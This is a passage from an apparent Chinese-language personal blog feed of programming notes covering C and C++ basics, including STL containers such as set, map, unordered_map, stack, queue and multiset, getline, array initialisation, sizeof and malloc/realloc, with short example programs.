class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;最大值：&quot;</span> &lt;&lt; *itMax &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; <span class="built_in">distance</span>(num.<span class="built_in">begin</span>(), itMax)</span><br><span class="line">         &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;最小值：&quot;</span> &lt;&lt; *itMin &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; <span class="built_in">distance</span>(num.<span class="built_in">begin</span>(), itMin)</span><br><span class="line">         &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; *<span class="built_in">max_element</span>(num.<span class="built_in">begin</span>(), num.<span class="built_in">end</span>()) &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">max_element</span>(num.<span class="built_in">begin</span>(), num.<span class="built_in">end</span>()) - num.<span class="built_in">begin</span>() &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/destiny0118/picgo/raw/master/pic/image-20210409152320212.png" alt="image-20210409152320212"></p>
<h1>set(集合)</h1>
<table>
<thead>
<tr>
<th>操作</th>
<th>unordered_set&lt;int&gt; nums1;</th>
<th>set&lt;int&gt; nums2;</th>
</tr>
</thead>
<tbody>
<tr>
<td>插入元素</td>
<td>nums1.insert(10);</td>
<td></td>
</tr>
<tr>
<td>判断元素是否存在</td>
<td>nums1.find(10)!=nums1.end()</td>
<td></td>
</tr>
<tr>
<td></td>
<td>nums1.count(10)</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h2 id="1-插入元素">1. 插入元素</h2>
<blockquote>
<p>s.insert(“A”); //插入元素</p>
<p>pair&lt;iterator,bool&gt; insert (const value_type&amp; val);</p>
<p>返回布尔对以表示是否发生插入，如果重复插入一个元素会返回false。返回迭代器指向新插入元素</p>
</blockquote>
<blockquote>
<p>set_union()</p>
<p>set_intersect()</p>
<p>set&lt;string&gt; s;</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//遍历集合中元素</span></span><br><span class="line"><span class="keyword">for</span> (string s : identifier)</span><br><span class="line">		cout &lt;&lt; s &lt;&lt; endl;</span><br><span class="line">	set&lt;string&gt;::iterator it;</span><br><span class="line">	<span class="keyword">for</span> (it = identifier.<span class="built_in">begin</span>(); it != identifier.<span class="built_in">end</span>(); it++)</span><br><span class="line">		cout &lt;&lt; *it &lt;&lt; endl;</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>map</th>
<th>unordered_map</th>
</tr>
</thead>
<tbody>
<tr>
<td>map&lt;pair&lt;int,int&gt;,int&gt; used</td>
<td>unordered_map&lt;pair&lt;int,int&gt;,int&gt; used（不可以）</td>
</tr>
</tbody>
</table>
<h1>map(映射)</h1>
<p><a href="https://blog.csdn.net/u013095333/article/details/89322198">C++判断map中key值是否存在</a></p>
<p>声明：</p>
<blockquote>
<p>map&lt;string,int&gt; count;</p>
</blockquote>
<h1>unordered_map</h1>
<table>
<thead>
<tr>
<th>操作</th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>test.count()</td>
<td></td>
<td></td>
</tr>
<tr>
<td>test.find()</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">unordered_map&lt;<span class="type">int</span>,<span class="type">int</span>&gt; cnt;</span><br><span class="line">ans+=cnt[x]  会插入不存在的点</span><br><span class="line">pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;不能作为建</span><br></pre></td></tr></table></figure>
<p>使用 <code>[]</code> 运算符对 <code>unordered_map</code> 中的键进行访问时，如果该键不存在，会自动创建该键，并关联一个默认值（对于内置类型，这个默认值是0或者空，对于自定义类型可能是默认构造函数创建的对象）。</p>
<p>遍历容器</p>
<p><a href="https://blog.csdn.net/qq_21539375/article/details/122003559">(10条消息) c++ unordered_map4种遍历方式_菊头蝙蝠的博客-CSDN博客_遍历unordered_map</a></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    遍历每一个元素</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print_ele</span><span class="params">(unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; &amp;pos)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">const</span> <span class="keyword">auto</span> &amp;x:pos)&#123;</span><br><span class="line">        <span class="type">int</span> key=x.first,value=x.second;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 结构化绑定 c++17</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> [key, value] : pos)</span><br><span class="line">        cout &lt;&lt; key &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; value &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 只使用键</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> [key, _] : pos)</span><br><span class="line">        cout &lt;&lt; key &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 迭代器遍历</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> iter = pos.<span class="built_in">begin</span>(); iter != pos.<span class="built_in">end</span>(); iter++) &#123;</span><br><span class="line">        cout &lt;&lt; iter-&gt;first &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; iter-&gt;second &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt;::iterator it = map.<span class="built_in">begin</span>(); it != map.<span class="built_in">end</span>();</span><br><span class="line">         it++) &#123;</span><br><span class="line">        cout &lt;&lt; it-&gt;first &lt;&lt; it-&gt;second &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>map.find(key) == map.end()    查找的key不在map中</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; test = &#123;&#123;<span class="number">1</span>, <span class="number">3</span>&#125;&#125;;</span><br><span class="line">    cout &lt;&lt; test[<span class="number">1</span>] &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; test[<span class="number">2</span>] &lt;&lt; endl;</span><br><span class="line">    test[<span class="number">3</span>]++;</span><br><span class="line">    cout &lt;&lt; test[<span class="number">3</span>] &lt;&lt; endl;</span><br><span class="line">    test[<span class="number">4</span>];</span><br><span class="line">    cout &lt;&lt; test[<span class="number">4</span>] &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/destiny0118/picgo/raw/master/20210515104051.png" alt="image-20210515104044254"></p>
<h1>stack(栈)</h1>
<p>声明：</p>
<blockquote>
<p>stack&lt;int&gt; s;</p>
</blockquote>
<p>操作：</p>
<blockquote>
<p>s.push(10)：返回栈顶元素的引用</p>
<p>s.pop()：无返回值，弹出栈顶元素，栈为空时不抛出异常</p>
<p>s.empty()：返回一个bool值表示栈是否为空</p>
<p>int t=s.top()：取栈顶元素，在栈为空时调用会出现<code>Segmentation fault</code></p>
</blockquote>
<h1>queue(队列)：先进先出</h1>
<blockquote>
<p>queue&lt;int&gt; s</p>
<p>s.push(int a)</p>
<p>s.pop()</p>
<p>s.empty()</p>
<p>t=s.front()：取队首元素（不删除）</p>
<p>priority_queue&lt;pair&lt;int,int&gt;,vector&lt;pair&lt;int,int&gt;&gt;,greater&lt;&gt;&gt; pq;</p>
<p>pq.push({0,0});</p>
<p>pq.push(0,0);  //错误</p>
<p>pq.emplace(0,0)</p>
</blockquote>
<h2 id="C-Vector转Set与Set转Vector"><a href="https://www.cnblogs.com/xwxz/p/13323712.html">C++ Vector转Set与Set转Vector</a></h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; vec;</span><br><span class="line">    vec = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">8</span> &#125;;</span><br><span class="line">    <span class="function">set&lt;<span class="type">int</span>&gt; <span class="title">st</span><span class="params">(vec.begin(), vec.end())</span></span>;</span><br><span class="line">    vec.<span class="built_in">assign</span>(st.<span class="built_in">begin</span>(), st.<span class="built_in">end</span>());</span><br><span class="line"></span><br><span class="line">    vector&lt;<span class="type">int</span>&gt;::iterator it;</span><br><span class="line">    <span class="keyword">for</span> (it = vec.<span class="built_in">begin</span>(); it != vec.<span class="built_in">end</span>(); it++)</span><br><span class="line">        cout &lt;&lt; *it&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="输入输出">输入输出</h2>
<p>c++标准库函数，有两种形式</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>头文件&lt;istream&gt;中输入流成员函数</p>
</li>
<li class="lvl-2">
<p>&lt;string&gt;中的普通函数</p>
<p>getline(cin,s) //读取换行符并丢弃，不保存到s中</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">istream&amp; <span class="title">getline</span> <span class="params">(istream&amp;  is, string&amp; str, <span class="type">char</span> delim)</span></span>;</span><br><span class="line"><span class="function">istream&amp; <span class="title">getline</span> <span class="params">(istream&amp;&amp; is, string&amp; str, <span class="type">char</span> delim)</span></span>;</span><br><span class="line"><span class="function">istream&amp; <span class="title">getline</span> <span class="params">(istream&amp;  is, string&amp; str)</span></span>;</span><br><span class="line"><span class="function">istream&amp; <span class="title">getline</span> <span class="params">(istream&amp;&amp; is, string&amp; str)</span></span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	读取delim分隔符并丢弃，不保存到str中</span></span><br><span class="line"><span class="comment">	is ：表示一个输入流，例如 cin。</span></span><br><span class="line"><span class="comment">	str ：string类型的引用，用来存储输入流中的流信息。</span></span><br><span class="line"><span class="comment">	delim ：char类型的变量，所设置的截断字符；在不自定义设置的情况下，遇到’\n’，则终止输入</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//读取一行存放在字符串中，将字符串变为输入流，再进行处理</span></span><br><span class="line"><span class="built_in">getline</span>(cin, str, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"><span class="function">stringstream <span class="title">ss</span><span class="params">(str)</span></span>;</span><br></pre></td></tr></table></figure>
<h2 id="array">array</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">#不能用另一个数组初始化一个数组，不能将一个数组赋值给一个数组</span><br><span class="line"><span class="type">int</span> a[]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>&#125;;</span><br><span class="line"><span class="type">int</span> a2[]=a;</span><br><span class="line">a2=a;</span><br></pre></td></tr></table></figure>
<p>迭代器并不是都可以进行加减迭代器实质上是一个指针，但是，并不是所有的容器的迭代器可以支持加减操作。</p>
<p>能进行算术运算的迭代器只有随机访问迭代器，要求容器元素存储在连续内存空间内，即vector、string、deque的迭代器是有加减法的；而map、set、multimap、multiset、list的迭代器是没有加减法的。他们仅支持++itr、–itr这些操作。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>语法</category>
      </categories>
      <tags>
        <tag>STL</tag>
      </tags>
  </entry>
  <entry>
    <title>C语法</title>
    <url>/2023/02/28/%E8%AF%AD%E6%B3%95/C++/C%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<h1>&lt;stdio.h&gt;</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>scanf</p>
<blockquote>
<p>读取空格、换行符</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">char</span> c;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>, &amp;c);</span><br><span class="line">    <span class="keyword">if</span> (c == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;****\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (c == <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;^^^^\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %c\n&quot;</span>, a, c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/img/202204191133356.png" alt="image-20210406120658645"></p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/img/202204191133436.png" alt="image-20210406120721087"></p>
</li>
<li class="lvl-2">
</li>
</ul>
<h1>数组</h1>
<h2 id="1-初始化">1. 初始化</h2>
<blockquote>
<p>int a[10];	声明，未初始化</p>
<p>int a[10]={0};  //全部初始化为0</p>
<p>int a[10]={1};	//第一个元素为1，后面初始化为0</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>], b[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;, c[<span class="number">10</span>] = &#123;<span class="number">1</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(a) / <span class="keyword">sizeof</span>(<span class="type">int</span>); ++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(b) / <span class="keyword">sizeof</span>(<span class="type">int</span>); ++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, b[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(c) / <span class="keyword">sizeof</span>(<span class="type">int</span>); ++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, c[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/destiny0118/picgo/raw/master/pic/image-20210411175728807.png" alt="image-20210411175728807"></p>
<h1>表达式</h1>
<h2 id="1-赋值表达式">1. 赋值表达式</h2>
<p>结果输出10</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a, b, c;</span><br><span class="line">    c = <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, a = b = c);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>语法</category>
      </categories>
  </entry>
  <entry>
    <title>C常用函数</title>
    <url>/2023/02/28/%E8%AF%AD%E6%B3%95/C++/C%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h1>1. sizeof</h1>
<blockquote>
<p>sizeof返回占用的字节数，但数组作为参数传递时不能有效计算占用的字节数，需加参数指明占用的字节数</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> a[])</span> &#123;</span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> len = <span class="keyword">sizeof</span>(a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;len: %d\n&quot;</span>, len);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, a[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">3</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="keyword">sizeof</span>(a));</span><br><span class="line">    sum(a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/destiny0118/picgo/raw/master/pic/image-20210406120005828.png" alt="image-20210406120005828"></p>
<h1>2. malloc realloc</h1>
<blockquote>
<p>头文件： stdlib.h</p>
</blockquote>
<p><a href="https://blog.csdn.net/qq_38810767/article/details/85265541">malloc/calloc/realloc之间区别详述</a></p>
<blockquote>
<p>realloc后，申请空间比原来大，重新分配地址空间</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> *a = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="number">10</span> * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    a[<span class="number">0</span>] = <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, a, a[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> *b = (<span class="type">int</span> *)<span class="built_in">realloc</span>(a, <span class="number">20</span> * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, b, b[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> *c = (<span class="type">int</span> *)<span class="built_in">realloc</span>(b, <span class="number">5</span> * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d&quot;</span>, c, c[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/destiny0118/picgo/raw/master/pic/image-20210409110803688.png" alt="image-20210409110803688"></p>
<p><img src="https://gitee.com/destiny0118/picgo/raw/master/pic/image-20210427184809807.png" alt="image-20210427184809807"></p>
<h1>3. memset</h1>
<blockquote>
<p>string.h</p>
</blockquote>
<blockquote>
<p>int column[MAX_N];</p>
<p>memset(column, 0, sizeof(int) * MAX_N);</p>
</blockquote>
<h1>4. 条件表达式</h1>
<blockquote>
<p>ax为0时，输出15</p>
<p>ax不为0时，输出6</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> ax = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> pc = <span class="number">5</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, pc = ax ? pc + <span class="number">1</span> : pc + <span class="number">10</span>);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>语法</category>
      </categories>
      <tags>
        <tag>技术</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/09/%E8%AF%AD%E6%B3%95/C++/STL%20API/</url>
    <content><![CDATA[<h1>1 STL</h1>
<ol>
<li class="lvl-3">Sequence Containers：顺序容器
<ol>
<li class="lvl-7">vector：动态数组，O(1)的随机存取。在尾部增删的复杂度是O(1)，可以用作stack。</li>
<li class="lvl-7">list：双向链表，不支持随机存取。</li>
<li class="lvl-7">deque：双端队列，支持O(1)的随机存取，O(1)时间的头部增删和尾部增删。</li>
<li class="lvl-7">array：固定大小的数组</li>
<li class="lvl-7">forward_list：单向链表</li>
</ol>
</li>
<li class="lvl-3">Container Adaptors：基于其它容器实现的数据结构
<ol>
<li class="lvl-7">stack：后入先出（LIFO），默认基于deque实现。stack常用于深度优先搜索，字符串匹配以及单调栈问题</li>
<li class="lvl-7">queue：先入先出（FIFO），默认基于deque实现，常用于广度优先搜索。</li>
<li class="lvl-7">priority_queue：最大值先出(默认)的数据结构，默认基于vector实现堆结构，可以在O(nlogn)时间排序数组，O(logn)插入值，O(1)时间获取最大值，O(logn)删除最大值。</li>
</ol>
</li>
<li class="lvl-3">Associative Containers：实现了排好序的数据结构
<ol>
<li class="lvl-7">set：有序集合，元素不可重复，底层默认为<mark>红黑树</mark>，即一种特殊的二叉查找树(BST)。在O(nlogn)时间排序数组，O(logn)时间插入、删除、查找任意值，O(logn)时间获得最大值或最小值。priority_queue不支持删除<mark>任意值</mark>。</li>
<li class="lvl-7">multiset：支持重复元素的set</li>
<li class="lvl-7">map：有序映射或有序表，在set的基础上加上映射关系，可以对每个元素key存一个value</li>
<li class="lvl-7">multimap：支持重复元素的map</li>
</ol>
</li>
<li class="lvl-3">Unordered Associative Containers：对每个Associative Containers实现哈希版本
<ol>
<li class="lvl-7">unordered_set：哈希集合，可以在O(1)的时间快速插入、查找、删除元素，常用于快速的查询一个元素是否在这个容器内。</li>
<li class="lvl-7">unordered_multiset：支持重复元素的unordered_set</li>
<li class="lvl-7">unordered_map：哈希映射或和哈希表，在unordered_set的基础上加上映射关系，可以对每一个元素key存一个值value。在某些情况下，如果key的范围已知且较小，可以用<mark>vector</mark>代替unordered_map，用位置表示key，且每个位置的值表示value</li>
<li class="lvl-7">unordered_multimap：支持重复元素的unordered_map</li>
</ol>
</li>
</ol>
<h1>2 set、multiset</h1>
<p><a href="http://c.biancheng.net/view/7203.html">C++ STL multiset容器详解 (biancheng.net)</a><br>
multiset可以存储int, string, struct, class等类型，对于自定义类型需要实现比较函数</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">	<span class="type">int</span> x,y;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">cmp</span>&#123;</span><br><span class="line">	<span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">const</span> Node&amp;a, <span class="type">const</span> Node&amp;b)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a.x==b.x?a.y&lt;b.y:a.x&lt;b.x;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">multiset&lt;Node,cmp&gt; s;</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>成员方法</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>begin()</td>
<td>返回指向容器中第一个（注意，是已排好序的第一个）元素的双向迭代器。</td>
</tr>
<tr>
<td>end()</td>
<td>返回指向容器最后一个元素（注意，是已排好序的最后一个）所在位置后一个位置的双向迭代器</td>
</tr>
<tr>
<td>rbegin()</td>
<td>返回指向最后一个（注意，是已排好序的最后一个）元素的反向双向迭代器。</td>
</tr>
<tr>
<td>rend()</td>
<td>返回指向第一个（注意，是已排好序的第一个）元素所在位置前一个位置的反向双向迭代器。</td>
</tr>
<tr>
<td>cbegin()</td>
<td>和 begin() 功能相同，只不过在其基础上，增加了 const 属性，不能用于修改容器内存储的元素值。</td>
</tr>
<tr>
<td>cend()</td>
<td>和 end() 功能相同，只不过在其基础上，增加了 const 属性，不能用于修改容器内存储的元素值。</td>
</tr>
<tr>
<td>crbegin()</td>
<td>和 rbegin() 功能相同，只不过在其基础上，增加了 const 属性，不能用于修改容器内存储的元素值。</td>
</tr>
<tr>
<td>crend()</td>
<td>和 rend() 功能相同，只不过在其基础上，增加了 const 属性，不能用于修改容器内存储的元素值。</td>
</tr>
<tr>
<td>find(val)</td>
<td>查找值为 val 的第一个元素，如果成功找到，则返回指向该元素的迭代器；反之，则返回end() 方法一样的迭代器。</td>
</tr>
<tr>
<td>lower_bound(val)</td>
<td>返回第一个大于或等于 val 的元素的迭代器，即元素位置。</td>
</tr>
<tr>
<td>upper_bound(val)</td>
<td>返回第一个大于 val 的元素的迭代器。</td>
</tr>
<tr>
<td>equal_range(val)</td>
<td>该方法返回一个 pair ，(pair.first,pair.second)=(lower_bound(),upper_bound())，表示值为val的范围。</td>
</tr>
<tr>
<td>empty()</td>
<td>若容器为空，则返回 true；否则 false。</td>
</tr>
<tr>
<td>size()</td>
<td>返回当前 multiset 容器中存有元素的个数。</td>
</tr>
<tr>
<td>max_size()</td>
<td>返回 multiset 容器所能容纳元素的最大个数</td>
</tr>
<tr>
<td>insert(val)</td>
<td>向 multiset 容器中插入元素。</td>
</tr>
<tr>
<td>erase(iter)</td>
<td>删除迭代器所指位置元素，无返回值</td>
</tr>
<tr>
<td>erase(val)</td>
<td>删除值为val的所有元素，返回删除个数</td>
</tr>
<tr>
<td>swap()</td>
<td>交换 2 个 multiset 容器中存储的所有元素。这意味着，操作的 2 个 multiset 容器的类型必须相同。</td>
</tr>
<tr>
<td>clear()</td>
<td>清空 multiset 容器中所有的元素，即令 multiset 容器的 size() 为 0。</td>
</tr>
<tr>
<td>emplace()</td>
<td>在当前 multiset 容器中的指定位置直接构造新元素。其效果和 insert() 一样，但效率更高。</td>
</tr>
<tr>
<td>emplace_hint()</td>
<td>和emplace()构造新元素的方式是一样的，不同之处在于，使用者必须为该方法提供一个指示新元素生成位置的迭代器，并作为该方法的第一个参数。</td>
</tr>
<tr>
<td>count(val)</td>
<td>查找值为 val 的元素的个数，并返回。</td>
</tr>
</tbody>
</table>
<p>c++语言中，multiset是<set>库中一个非常有用的类型，它可以看成一个序列，插入一个数，删除一个数都能够在O(logn)的时间内完成，而且他能时刻保证序列中的数是有序的，而且序列中可以存在重复的数。</p>
<h3 id="2-1-1-简单应用：">2.1.1 简单应用：</h3>
<p>通过一个程序来看如何使用multiset：</p>
